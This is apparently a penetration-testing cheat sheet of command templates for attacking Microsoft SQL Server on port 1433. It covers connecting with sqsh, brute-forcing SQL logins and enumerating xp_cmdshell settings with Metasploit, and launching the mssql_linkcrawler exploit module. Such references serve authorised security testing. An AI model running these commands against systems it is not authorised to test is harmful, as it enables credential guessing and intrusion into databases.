# msssql

% mssql, Microsoft SQL Server, 1433
#plateform/linux  #target/remote  #protocol/mssql  #port/1433 

## mssql - connect
#cat/ATTACK/CONNECT 
```
sqsh -S <ip> -U <user>
```

## mssql - enum sql login
#cat/ATTACK/BRUTEFORCE-SPRAY 
```
msfconsole -x "use admin/mssql/mssql_enum_sql_logins; set RHOSTS <ip>; set USER_FILE <user_file>; set PASS_FILE <pass_file>; run"
```

## mssql - enum configuration setting (xp-cmdshell)
#cat/RECON 
```
msfconsole -x "use auxiliary/admin/mssql/mssql_enum; set RHOST <ip>; set password <password>; run"
```

## mssql link crawler
#cat/ATTACK/EXPLOIT 
```
msfconsole -x "use exploit/windows/mssql/mssql_linkcrawler"
```
